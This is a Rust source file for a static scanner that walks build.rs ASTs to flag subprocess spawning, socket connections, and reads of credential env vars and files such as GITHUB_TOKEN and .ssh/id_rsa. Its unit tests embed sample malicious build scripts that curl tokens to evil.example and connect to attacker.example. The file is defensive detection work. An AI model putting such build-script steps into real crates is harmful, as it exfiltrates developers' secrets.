//! Rust `build.rs` static scanner using `syn` AST visitor.
//!
//! Parses Rust source files into ASTs and walks them to detect:
//! - `std::process::Command::new()` — subprocess spawning
//! - `std::net::TcpStream::connect()` / `UdpSocket::bind()` — network access
//! - `std::env::var()` / `std::env::vars()` — environment variable access
//! - `std::fs::read()` / `std::fs::read_to_string()` targeting sensitive paths
//!
//! **Security invariant:** This module NEVER executes or compiles the analyzed code.

use std::path::Path;

use syn::visit::Visit;
use syn::{Expr, ExprCall, ExprMethodCall, ExprPath, File as SynFile, Lit};


use crate::findings::{Finding, FindingKind, ScanReport, Severity};


/// Sensitive environment variable name patterns.
/// If an `env::var()` call accesses a key matching any of these (case-insensitive),
/// the finding is elevated to CRITICAL.
const SENSITIVE_ENV_PATTERNS: &[&str] = &[
    "token",
    "secret",
    "key",
    "password",
    "credential",
    "aws_",
    "azure_",
    "gcp_",
    "github_",
    "npm_",
    "docker_",
    "ssh_auth_sock",
    "api_key",
    "private_key",
    "access_key",
];

/// Sensitive filesystem paths. If an `fs::read()` or similar call targets
/// a path matching any of these, the finding is elevated to CRITICAL.
const SENSITIVE_PATH_PATTERNS: &[&str] = &[
    ".ssh",
    ".aws",
    ".gnupg",
    ".env",
    ".npmrc",
    ".cargo/credentials",
    "id_rsa",
    "id_ed25519",
    "credentials.toml",
    "config.toml",
];

/// Scan a Rust source file for suspicious patterns.
///
/// Parses the file content as a `syn::File` AST and walks it with
/// [`BuildScriptVisitor`] to detect dangerous API calls.
///
/// # Arguments
/// * `path` — The file path (used for finding locations, not for reading)
/// * `content` — The Rust source code to analyze
///
/// # Returns
/// A `ScanReport` containing all findings from this file.
pub fn scan_rust_file(path: &Path, content: &str) -> ScanReport {
    let mut report = ScanReport::new();
    report.files_scanned = 1;

    let ast: SynFile = match syn::parse_file(content) {
        Ok(ast) => ast,
        Err(e) => {
            report.findings.push(Finding::new(
                path.to_path_buf(),
                None,
                Severity::Info,
                FindingKind::CommandExecution,
                format!("Failed to parse Rust source: {e}"),
            ));
            return report;
        }
    };

    let mut visitor = BuildScriptVisitor {
        file_path: path.to_path_buf(),
        findings: Vec::new(),
    };

    visitor.visit_file(&ast);
    report.findings = visitor.findings;
    report
}

/// AST visitor that walks a parsed Rust file looking for suspicious patterns.
///
/// Implements `syn::visit::Visit` to traverse every expression in the AST
/// and check for dangerous API calls.
struct BuildScriptVisitor {
    file_path: std::path::PathBuf,
    findings: Vec<Finding>,
}

impl BuildScriptVisitor {
    /// Check if a path segment chain matches a known dangerous API.
    /// Returns the matched segments as a string for reporting.
    fn path_to_string(path: &ExprPath) -> String {
        path.path
            .segments
            .iter()
            .map(|s| s.ident.to_string())
            .collect::<Vec<_>>()
            .join("::")
    }

    /// Get approximate line number from a span.
    fn span_line(span: proc_macro2::Span) -> Option<usize> {
        let start = span.start();
        Some(start.line)
    }

    /// Check if a string literal matches sensitive env var patterns.
    fn is_sensitive_env_key(key: &str) -> bool {
        let lower = key.to_lowercase();
        SENSITIVE_ENV_PATTERNS
            .iter()
            .any(|pattern| lower.contains(pattern))
    }

    /// Check if a string literal matches sensitive filesystem paths.
    fn is_sensitive_path(path_str: &str) -> bool {
        let lower = path_str.to_lowercase().replace('\\', "/");
        SENSITIVE_PATH_PATTERNS
            .iter()
            .any(|pattern| lower.contains(pattern))
    }

    /// Extract a string literal from an expression, if it is one.
    fn extract_string_lit(expr: &Expr) -> Option<String> {
        if let Expr::Lit(expr_lit) = expr {
            if let Lit::Str(lit_str) = &expr_lit.lit {
                return Some(lit_str.value());
            }
        }
        None
    }

    /// Check a function-call-style expression (e.g., `Command::new("sh")`).
    fn check_function_call(&mut self, call: &ExprCall) {
        if let Expr::Path(path) = call.func.as_ref() {
            let path_str = Self::path_to_string(path);
            let line = Self::span_line(path.path.segments.last().unwrap().ident.span());

            // Detect Command::new()
            if path_str.ends_with("Command::new") || path_str == "Command::new" {
                let arg_str = call
                    .args
                    .first()
                    .and_then(Self::extract_string_lit)
                    .unwrap_or_else(|| "<dynamic>".to_string());

                self.findings.push(
                    Finding::new(
                        self.file_path.clone(),
                        line,
                        Severity::Warn,
                        FindingKind::CommandExecution,
                        format!(
                            "Process spawning detected: Command::new({:?}) — build scripts should not spawn subprocesses",
                            arg_str
                        ),
                    )
                    .with_snippet(format!("{}({:?})", path_str, arg_str)),
                );
            }

            // Detect TcpStream::connect()
            if path_str.ends_with("TcpStream::connect")
                || path_str.ends_with("TcpListener::bind")
            {
                let arg_str = call
                    .args
                    .first()
                    .and_then(Self::extract_string_lit)
                    .unwrap_or_else(|| "<dynamic>".to_string());

                self.findings.push(
                    Finding::new(
                        self.file_path.clone(),
                        line,
                        Severity::Critical,
                        FindingKind::NetworkAccess,
                        format!(
                            "Network access detected: {}({:?}) — build scripts must not make network connections",
                            path_str, arg_str
                        ),
                    )
                    .with_snippet(format!("{}({:?})", path_str, arg_str)),
                );
            }

            // Detect UdpSocket::bind() / UdpSocket::connect()
            if path_str.ends_with("UdpSocket::bind")
                || path_str.ends_with("UdpSocket::connect")
            {
                let arg_str = call
                    .args
                    .first()
                    .and_then(Self::extract_string_lit)
                    .unwrap_or_else(|| "<dynamic>".to_string());

                self.findings.push(
                    Finding::new(
                        self.file_path.clone(),
                        line,
                        Severity::Critical,
                        FindingKind::NetworkAccess,
                        format!(
                            "UDP network access detected: {}({:?}) — build scripts must not open sockets",
                            path_str, arg_str
                        ),
                    )
                    .with_snippet(format!("{}({:?})", path_str, arg_str)),
                );
            }

            // Detect env::var() with sensitive keys
            if path_str.ends_with("env::var") || path_str.ends_with("env::var_os") {
                if let Some(key) = call.args.first().and_then(Self::extract_string_lit) {
                    let severity = if Self::is_sensitive_env_key(&key) {
                        Severity::Critical
                    } else {
                        Severity::Info
                    };
                    let kind = if Self::is_sensitive_env_key(&key) {
                        FindingKind::SensitiveEnvAccess
                    } else {
                        FindingKind::EnvironmentAccess
                    };
                    self.findings.push(
                        Finding::new(
                            self.file_path.clone(),
                            line,
                            severity,
                            kind,
                            format!(
                                "Environment variable access: env::var({:?}){}",
                                key,
                                if Self::is_sensitive_env_key(&key) {
                                    " — this is a sensitive credential key"
                                } else {
                                    ""
                                }
                            ),
                        )
                        .with_snippet(format!("env::var({:?})", key)),
                    );
                } else {
                    // Dynamic key — can't determine safety statically
                    self.findings.push(
                        Finding::new(
                            self.file_path.clone(),
                            line,
                            Severity::Warn,
                            FindingKind::EnvironmentAccess,
                            "Environment variable access with dynamic key — cannot determine if sensitive".to_string(),
                        )
                        .with_snippet("env::var(<dynamic>)".to_string()),
                    );
                }
            }

            // Detect env::vars() — bulk env access
            if path_str.ends_with("env::vars") || path_str.ends_with("env::vars_os") {
                self.findings.push(
                    Finding::new(
                        self.file_path.clone(),
                        line,
                        Severity::Warn,
                        FindingKind::EnvironmentAccess,
                        "Bulk environment variable enumeration detected — build scripts should not enumerate all env vars".to_string(),
                    )
                    .with_snippet(format!("{}()", path_str)),
                );
            }

            // Detect fs::read / fs::read_to_string targeting sensitive paths
            if path_str.ends_with("fs::read")
                || path_str.ends_with("fs::read_to_string")
                || path_str.ends_with("fs::read_dir")
            {
                if let Some(target_path) = call.args.first().and_then(Self::extract_string_lit) {
                    let severity = if Self::is_sensitive_path(&target_path) {
                        Severity::Critical
                    } else {
                        Severity::Info
                    };
                    let kind = if Self::is_sensitive_path(&target_path) {
                        FindingKind::SensitiveFileRead
                    } else {
                        FindingKind::SensitiveFileRead
                    };
                    self.findings.push(
                        Finding::new(
                            self.file_path.clone(),
                            line,
                            severity,
                            kind,
                            format!(
                                "Filesystem read detected: {}({:?}){}",
                                path_str,
                                target_path,
                                if Self::is_sensitive_path(&target_path) {
                                    " — targets a sensitive credential path"
                                } else {
                                    ""
                                }
                            ),
                        )
                        .with_snippet(format!("{}({:?})", path_str, target_path)),
                    );
                }
            }
        }
    }

    /// Check a method-call-style expression (e.g., `cmd.spawn()`, `cmd.output()`).
    fn check_method_call(&mut self, method_call: &ExprMethodCall) {
        let method_name = method_call.method.to_string();
        let line = Self::span_line(method_call.method.span());

        // Detect .spawn() and .output() on Command chains
        if method_name == "spawn" || method_name == "output" || method_name == "status" {
            self.findings.push(
                Finding::new(
                    self.file_path.clone(),
                    line,
                    Severity::Warn,
                    FindingKind::CommandExecution,
                    format!(
                        "Process execution detected: .{}() — build script is executing a subprocess",
                        method_name
                    ),
                )
                .with_snippet(format!(".{}()", method_name)),
            );
        }

        // Detect .connect() which might be TcpStream::connect()
        if method_name == "connect" {
            let arg_str = method_call
                .args
                .first()
                .and_then(Self::extract_string_lit)
                .unwrap_or_else(|| "<dynamic>".to_string());

            self.findings.push(
                Finding::new(
                    self.file_path.clone(),
                    line,
                    Severity::Critical,
                    FindingKind::NetworkAccess,
                    format!(
                        "Network connection detected: .connect({:?}) — build scripts must not make network connections",
                        arg_str
                    ),
                )
                .with_snippet(format!(".connect({:?})", arg_str)),
            );
        }
    }
}

impl<'ast> Visit<'ast> for BuildScriptVisitor {
    fn visit_expr_call(&mut self, call: &'ast ExprCall) {
        self.check_function_call(call);
        // Continue visiting child expressions
        syn::visit::visit_expr_call(self, call);
    }

    fn visit_expr_method_call(&mut self, method_call: &'ast ExprMethodCall) {
        self.check_method_call(method_call);
        // Continue visiting child expressions
        syn::visit::visit_expr_method_call(self, method_call);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn scan(code: &str) -> ScanReport {
        scan_rust_file(&PathBuf::from("test_build.rs"), code)
    }

    #[test]
    fn test_detect_command_new() {
        let report = scan(r#"
            fn main() {
                std::process::Command::new("curl")
                    .arg("https://evil.example/exfil")
                    .spawn()
                    .unwrap();
            }
        "#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::CommandExecution));
    }

    #[test]
    fn test_detect_command_short_path() {
        let report = scan(r#"
            use std::process::Command;
            fn main() {
                Command::new("sh").arg("-c").arg("curl https://evil.example").output().unwrap();
            }
        "#);
        let cmd_findings: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.kind == FindingKind::CommandExecution)
            .collect();
        // Should detect both Command::new and .output()
        assert!(cmd_findings.len() >= 2);
    }

    #[test]
    fn test_detect_tcp_stream_connect() {
        let report = scan(r#"
            fn main() {
                let stream = std::net::TcpStream::connect("evil.example:443").unwrap();
            }
        "#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::NetworkAccess));
        assert!(report.findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn test_detect_sensitive_env_var() {
        let report = scan(r#"
            fn main() {
                let token = std::env::var("GITHUB_TOKEN").unwrap();
            }
        "#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::SensitiveEnvAccess));
        assert!(report.findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn test_detect_non_sensitive_env_var() {
        let report = scan(r#"
            fn main() {
                let home = std::env::var("HOME").unwrap();
            }
        "#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::EnvironmentAccess));
        assert!(report.findings.iter().any(|f| f.severity == Severity::Info));
    }

    #[test]
    fn test_detect_sensitive_file_read() {
        let report = scan(r#"
            fn main() {
                let key = std::fs::read_to_string("/home/user/.ssh/id_rsa").unwrap();
            }
        "#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::SensitiveFileRead));
        assert!(report.findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn test_detect_env_vars_bulk() {
        let report = scan(r#"
            fn main() {
                for (key, value) in std::env::vars() {
                    println!("{}={}", key, value);
                }
            }
        "#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::EnvironmentAccess));
        assert!(report.findings.iter().any(|f| f.severity == Severity::Warn));
    }

    #[test]
    fn test_benign_build_script() {
        let report = scan(r#"
            fn main() {
                println!("cargo:rerun-if-changed=build.rs");
                println!("cargo:rustc-link-lib=static=foo");
            }
        "#);
        // A benign build script should produce no WARN or CRITICAL findings
        assert!(!report.has_warnings());
    }

    #[test]
    fn test_connect_method_call() {
        let report = scan(r#"
            use std::net::TcpStream;
            fn main() {
                let stream = TcpStream::connect("attacker.example:8080").unwrap();
            }
        "#);
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::NetworkAccess));
    }

    #[test]
    fn test_malicious_combo_command_plus_env() {
        let report = scan(r#"
            use std::process::Command;
            fn main() {
                let token = std::env::var("GITHUB_TOKEN").unwrap();
                Command::new("curl")
                    .arg(format!("https://evil.example/steal?t={}", token))
                    .output()
                    .unwrap();
            }
        "#);
        // Should find both credential access and command execution
        assert!(report.has_critical());
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::SensitiveEnvAccess));
        assert!(report.findings.iter().any(|f| f.kind == FindingKind::CommandExecution));
    }
}
